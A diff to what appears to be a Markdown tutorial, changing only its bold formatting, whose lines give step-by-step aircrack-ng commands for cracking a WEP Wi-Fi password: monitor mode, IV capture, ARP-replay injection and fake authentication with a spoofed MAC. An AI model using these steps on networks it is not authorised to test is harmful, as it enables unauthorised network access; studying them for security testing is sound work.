@@ -19,11 +19,11 @@
 
 ###To capture a **WEP** Wifi password you have to do the following steps:
  
-###**Step 1: ** The first step you have to do is active the **monitor mode**, same as WPA/WPA2 protocol
+###Step 1: The first step you have to do is active the **monitor mode**, same as WPA/WPA2 protocol
  
 ```airmon-ng start wlp2s0 or airmon-ng start wlan0```
  
-###**Step 2: ** Execute airodump-ng to save the IV packages (packages where the password travels)
+###Step 2: Execute airodump-ng to save the IV packages (packages where the password travels)
  
 ```airodump-ng -w datos wlp2s0 ó airodump-ng -w datos wlan0```
  
@@ -35,19 +35,19 @@
  
 ```airodump-ng --ivs -w datos -c 11 wlp2s0 ó airodump-ng --ivs -w datos -c 11 wlan0```
  
-###**Step 3: ** Now we just need to accelerate the capture IV's process through the injected traffic from the attacker's computer. To do this you will use the authenticated and associated client in the next step. Let capture an ARP-request packet, and then reinjected into the network to dramatically increase the number of IVs packets.
+###Step 3: Now we just need to accelerate the capture IV's process through the injected traffic from the attacker's computer. To do this you will use the authenticated and associated client in the next step. Let capture an ARP-request packet, and then reinjected into the network to dramatically increase the number of IVs packets.
  
 ```aireplay-ng -3 -b MAC_AP -h MAC_FALSO_CLIENTE -x 600 wlp2s0 ó aireplay-ng -3 -b MAC_AP -h MAC_FALSO_CLIENTE -x 600 wlan0```
  
 ###where '-3' indicates attack type and '-x 600' allow us to indicates the speed of the reinjected packages.
  
-###**Step 4: ** To inject packets you are going to authenticate and associate with a fictitious network client.
+###Step 4: To inject packets you are going to authenticate and associate with a fictitious network client.
  
 ```aireplay-ng -1 10 -e NOMBREWIFI -a MAC_AP -h MAC_FALSO_CLIENTE wlp2s0```
  
 ###where '-1 10' indicates you are goint to send 10 authentication packages, '-a MAC_AP' indicates the MAC point acces adress and '-h MAC_FALSO_CLIENTE' indicates a fake MAC adress.
  
-###**Last Step: ** Now you can execute on another console **aircrack-ng** to analyze the IV's packages obtained by **airodump-ng** and stored in **datos-01.ivs** file.
+###Last Step: Now you can execute on another console **aircrack-ng** to analyze the IV's packages obtained by **airodump-ng** and stored in **datos-01.ivs** file.
  
 ```aircrack-ng -0 datos-01.ivs```
  
@@ -57,7 +57,7 @@
  
 ###where '-n 64' indicates for example the length of WEP password.
  
-###When **aircrack-ng** ends, he show us the WEP password on screen.
+###When aircrack-ng ends, he show us the WEP password on screen.
 
 ###---------------------------------------------------------------------------------------------------------------------------
 
